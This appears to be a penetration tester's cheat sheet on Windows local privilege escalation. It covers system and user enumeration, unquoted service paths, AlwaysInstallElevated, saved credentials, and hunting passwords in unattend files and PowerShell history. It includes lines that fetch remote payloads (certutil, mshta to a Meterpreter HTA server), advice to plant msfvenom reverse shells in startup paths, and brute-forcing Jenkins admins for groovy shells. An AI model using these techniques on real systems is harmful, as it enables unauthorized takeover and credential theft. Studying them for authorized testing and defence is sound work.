# Local PrivEsc
---
The main goal is to be a local administrator.This can be achieved by regular windows PrivESC techinques like:
- DLL Hijaking.
- Unquoted service path.
- Missing patches.
- Automated deployment and AutoLogon passwords in clear text.
- AlwaysInstallElevated (Any user can run MSI as SYSTEM).
- Misconfigured Services.
### Tools than can be used for PrivESC
- [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [**BeRoot**](https://github.com/AlessandroZ/BeRoot/releases)
- [**Privesc**](https://github.com/enjoiz/Privesc)

#### Run all checks:
- **PowerUp **-> Invoke-AllChecks
- **BeRoot** -> .\beroot.exe
- **Privesc **-> Invoke-PrivESC
---
## info about the OS
```powershell
systeminfo
hostname
#To see the patches done to the os use Windows management instrumentation command
wmic qfe 
#To list the logical drives:
wmic logicaldisk
```
## Determinig PS version
```powershell
(Get-ItemProperty
HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngin
e -Name PowerShellVersion).PowerShellVersion
```
## PSDrives & Providers
- A PSDrive is a pointer to a data structure that is managed by
something called a PSProvider.
- PSDrives are attacker-controlable. 
```powershell
#Providers are enumerable with:
Get-PSProvider
#PSDrives are Enumerable with:
Get-PSDrive
```
## User enumeration
```powershell
#To get privileges for the user
whoami /priv
#To get the groups for the user
whoami /groups
#To list all users on the machine
net user
#To get info about s single user
net user <USER>
#To list all members of a group
netstat localgroup <GROUP>
```
## Network enumeration
```powershell
#To network stats  
ipconfig /all  
arp -a  
netstat -ano
```
## AV enumeration
```powershell
#To see the status of the windows defender  
sc query windefend  
#To list all the services running on the box  
sc qureryex type = service  
#To see the stat of the firewall   
netsh firewall show state  
netsh advfirewall dump   
#Config of firewall  
netsh firewall show config 
```
## Download files using CMD
```powershell
certutil -urlcache -f http://<site> <FILE> <location to save to on remote mahine>

#For Powershell you can use curl :)
```

## Windows linux subsystem
```powershell
#Searching for necessary executables
where /R C:\windows bash.exe  
where /R C:\windows wsl.exe
```

## Alternative data streams
```powershell
dir /R  
more < <data stream> #To see the content
```
## Run As
```powershell
cmdkey /list  
C:\Windows\System32\runas.exe user:ACCESS\Administator savecred "C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop
```
## Auto Run
```powershell
#Some programms are running automatically on boot so we want to see if a program is auto runnning as admin to replace thar programme with one customized   
#using msfvenom to get a reverse shell
wmic startup get caption,command 2>nul
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
#You can find them using powerup.ps1
```
## AlwaysInstallElevated
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Find using powerup.ps1 OR winPEAS
```
## SeImpersonate
> **Low level explaination:** https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
## Unquoted service path
```powershell
## Unquoted service path
#Lets suppose we have this service running
C:\FTPServer\FTP server\filezilla\filezilla.exe
#Notice the space between the 'FTP' and 'server'
#This can be exploited by putting an executable in the path
C:\FTPServer\FTP.exe
#Now after restrating the service our malicious executable will be executed.

#Mitigation -> put quotes.
'C:\FTPServer\FTP server\filezilla\filezilla.exe'
```
**Manually**
```powershell
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
Get-wmiobject -class win32_service | select pathname
```
 **Powerup**
```powershell
#Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```
## Get Services where the current user can write to its binary path or change arguments in the binary
```powershell
#Using PowerUp.ps1
Get-ModifiableServiceFile -Verbose
```
## Get services whose configuration current user can modify
```powershell
#Using PowerUp.ps1
Get-ModifiableService -Verbose
```
## Startup Apps
```powershell
#Have to do manually and looking for a 'F' full write read access to inject an msfvenome .exe to get a RevShell.
#icalcs is tool used to check permissions or delete or modify  
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
## Finding Saved Creds
```powershell
cmdkey /list
#If Admin creds are saved then run
runas.exe /savecred /user:administrator cmd
```
## Deleted Files
- Search Recycle bin for files that contain or may contain passwords such like **unattend.xml**
## Unattended files
```txt
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>null
```
 ## Powershell history
** Default Location**
```powershell
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
#For example
C:\Users\zeyad\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
## Powershell Trascript
- This service logges the PowerShell session from commands and output  of the commands.
- Default logfile place is C:\Users\%USER%\Documents
```powershell
#Example 
cat C:\Users\zeyad\DocumentsFILE.txt | select-string "pass","cred"
```
## Upgrading from a regular shell to Meterpreter
#### Module :
**1- exploit/windows/misc/hta_server**
-   This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell..
-   On attacker machine

```powershell
mshta.exe http://<URL>.hta
```
---
## Feature Abuse - Enterprise applications
- **Jenkins** : Runs as a local admin so getting a shell from it will let us own the machine we are on.
	-  Visit the url then  find the admin user then brute force the password
	- After you get in ,navigate to /script and get a groovy payload to execute commands or get a reverse shell.
	 - Suggested to try the username as the password or the reverse of the username as a password.
	- if you didn't manage to have access as an admin but you had access as a user you can abuse a project that you can "CONFIGURE" to get OS command execution.
	- Easy way to look for a Configurable project if there are many projects is to navigate to a project then adding ""/configure" and then bruteforce projects using burpsuite or whatever.
## Useful links
- [**More Resources for PrivESC**](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)